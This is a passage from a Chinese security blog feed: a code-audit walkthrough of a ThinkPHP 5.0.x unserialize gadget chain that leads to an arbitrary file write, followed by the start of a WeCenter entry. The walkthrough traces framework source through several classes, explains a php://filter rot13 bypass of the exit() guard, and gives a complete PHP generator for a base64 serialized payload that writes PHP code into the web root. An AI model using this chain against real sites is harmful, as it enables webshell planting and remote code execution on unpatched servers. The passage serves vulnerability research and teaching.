$modelRelation-&gt;getRelation();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> BadMethodCallException(<span class="string">'method not exists:'</span> . get_class($modelRelation) . <span class="string">'-&gt; getRelation'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们注意下<code>$modelRelation</code>参数，他的值由<code>$modelRelation = $this-&gt;$relation();</code>这句得到，<code>$relation</code>值由<code>$name</code>决定，<code>$name</code>值由<code>$this-&gt;append</code>决定，是可控的，那么这里我们就可以调用我们可控的方法，这里选择<code>Modle</code>类中的<code>getError</code>方法,因为其返回值直接可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里<code>$modelRelation</code>就是完全可控的，在<code>getRelationData</code>方法中，执行到<code>$value = $modelRelation-&gt;getRelation();</code>时，就可以执行任意类的<code>getRelation</code>方法，这里选择位于<code>thinkphp/library/think/model/relation/HasOne.php</code>的<code>HasOne</code>类的<code>getRelation</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($subRelation = <span class="string">''</span>, $closure = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 执行关联定义方法</span></span><br><span class="line">    $localKey = <span class="keyword">$this</span>-&gt;localKey;</span><br><span class="line">    <span class="keyword">if</span> ($closure) &#123;</span><br><span class="line">        call_user_func_array($closure, [ &amp; <span class="keyword">$this</span>-&gt;query]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断关联类型执行查询</span></span><br><span class="line">    $relationModel = <span class="keyword">$this</span>-&gt;query</span><br><span class="line">        -&gt;removeWhereField(<span class="keyword">$this</span>-&gt;foreignKey)</span><br><span class="line">        -&gt;where(<span class="keyword">$this</span>-&gt;foreignKey, <span class="keyword">$this</span>-&gt;parent-&gt;$localKey)</span><br><span class="line">        -&gt;relation($subRelation)</span><br><span class="line">        -&gt;find();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($relationModel) &#123;</span><br><span class="line">        $relationModel-&gt;setParent(<span class="keyword">clone</span> <span class="keyword">$this</span>-&gt;parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $relationModel;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注如下代码段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$relationModel = <span class="keyword">$this</span>-&gt;query</span><br><span class="line">            -&gt;removeWhereField(<span class="keyword">$this</span>-&gt;foreignKey)</span><br><span class="line">            -&gt;where(<span class="keyword">$this</span>-&gt;foreignKey, <span class="keyword">$this</span>-&gt;parent-&gt;$localKey)</span><br><span class="line">            -&gt;relation($subRelation)</span><br><span class="line">            -&gt;find();</span><br></pre></td></tr></table></figure><p>这里<code>$this-&gt;query</code>可控，<code>$this-&gt;foreignKey</code>可控，这样就可以触发任意不存在<code>removeWhereField</code>方法的类的<code>__call</code>方法，这里选择触发位于<code>thinkphp/library/think/console/Output.php</code>的<code>Output</code>类的<code>__call</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump($args);</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">$this</span>-&gt;styles)) &#123;</span><br><span class="line">            array_unshift($args, $method);<span class="comment">//$args-&gt;class Relation-&gt;$foreignKey</span></span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">'block'</span>], $args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, $method)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, $method], $args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">__CLASS__</span> . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着由于<code>return call_user_func_array([$this, &#39;block&#39;], $args);</code>会触发<code>block</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span><span class="params">($style, $message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;writeln(<span class="string">"&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>writeln</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span><span class="params">($messages, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write($messages, <span class="keyword">true</span>, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>write</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($messages, $newline = false, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>$this-&gt;handle</code>可控，我们又可以实现对任意类的<code>write</code>方法的调用，这里选择位于<code>think/session/driver/Memcache.php</code>的<code>Memcache</code>类的<code>write</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($sessID, $sessData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">'session_name'</span>] . $sessID, $sessData, <span class="keyword">$this</span>-&gt;config[<span class="string">'expire'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的<code>$this-&gt;handler</code>可控，这样我们可以调用其他类的<code>set</code>方法，这里选择位于<code>thinkphp/library/think/cache/driver/File.php</code>的<code>File</code>类的<code>set</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($expire <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也是该链写文件的部分，看一下<code>file_put_contents($filename, $data);</code>的两个参数</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="variable">$data</span> = serialize(<span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><p>先看<code>$filename</code>，跟进<code>getCacheKey</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">($name, $auto = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $name = md5($name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'cache_subdir'</span>]) &#123;</span><br><span class="line">        <span class="comment">// 使用子目录</span></span><br><span class="line">        $name = substr($name, <span class="number">0</span>, <span class="number">2</span>) . DS . substr($name, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">        $name = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . DS . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;options[<span class="string">'path'</span>] . $name . <span class="string">'.php'</span>;</span><br><span class="line">    $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$filename</code>是由<code>$this-&gt;options[&#39;path&#39;]</code>和<code>$name</code>组成的，是可控的，那么<code>$filename</code>就是可控的，其中md5值我们可以自己算出来</p><p>然后看一下<code>$data</code>，其值由<code>$value</code>决定，向上回溯会发现，该值的类型是布尔类型，也就是说我们在此处无法控制<code>$data</code>的值，那么目前我们无法写任意<code>shell</code>，于是接着回到<code>set</code>方法中，注意到该条语句<code>$this-&gt;setTagItem($filename);</code>，跟进<code>setTagItem</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;</span><br><span class="line">        $key       = <span class="string">'tag_'</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has($key)) &#123;</span><br><span class="line">            $value   = explode(<span class="string">','</span>, <span class="keyword">$this</span>-&gt;get($key));</span><br><span class="line">            $value[] = $name;</span><br><span class="line">            $value   = implode(<span class="string">','</span>, array_unique($value));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = $name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set($key, $value, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法中最后重新调用了<code>set</code>方法，其中<code>$key  = &#39;tag_&#39; . md5($this-&gt;tag);</code>中<code>$this-&gt;tag</code>可控，则<code>$key</code>可控，而<code>$value = $name</code>，<code>$name</code>是刚刚的<code>$filename</code>，那么<code>$value</code>也是可控的，在此我们在这里再次调用<code>set</code>方法，同时也能完全控制写入的文件名和文件内容，在写入文件内容时可以注意到如下语句</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data   = <span class="string">"&lt;?php\n//"</span> . <span class="keyword">sprintf</span>(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br></pre></td></tr></table></figure><p>我们需要消除该处<code>exit()</code>方法的限制，这里我们可以使用<code>伪协议+rot13</code>编码绕过</p><h2 id="payload编写-2"><a href="#payload编写-2" class="headerlink" title="payload编写"></a>payload编写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $handler = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line">    <span class="comment">//protected $tag;</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;tag = 'nocatch';</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $tag;</span><br><span class="line">    <span class="keyword">protected</span> $options = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="string">'nocatch'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">'cache_subdir'</span>=&gt;<span class="keyword">false</span>,</span><br><span class="line">            <span class="string">'prefix'</span>=&gt;<span class="string">''</span>,</span><br><span class="line">            <span class="string">'path'</span>=&gt;<span class="string">'php://filter/write=string.rot13/resource=./static/&lt;?cuc cucvasb();?&gt;'</span>,</span><br><span class="line">            <span class="string">'data_compress'</span>=&gt;<span class="keyword">false</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> $styles = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;styles = [<span class="string">'removeWhereField'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">      <span class="keyword">protected</span> $query;</span><br><span class="line">      <span class="keyword">protected</span> $foreignKey;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Output();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;foreignKey = <span class="string">"aaaaaaaaa"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">protected</span> $error;</span><br><span class="line">    <span class="keyword">protected</span> $parent;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">'yemoli'</span>=&gt;<span class="string">'getError'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.anquanke.com/post/id/196364an" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364an</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;5-1-x&quot;&gt;&lt;a href=&quot;#5-1-x&quot; class=&quot;headerlink&quot; title=&quot;5.1.x&quot;&gt;&lt;/a&gt;5.1.x&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;测试环境&lt;/p&gt;
&lt;p&gt;tp5.1.35&lt;/p&gt;
&lt;p&gt;php7.0.9&lt;/p&gt;
&lt;/bl
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>WeCenter V3.3.4漏洞复现</title>
    <link href="https://yml-sec.top/2020/02/29/WeCenter-V3-3-4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://yml-sec.top/2020/02/29/WeCenter-V3-3-4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-02-29T10:23:14.000Z</published>
    <updated>2020-03-01T05:33:50.003Z</updated>
    
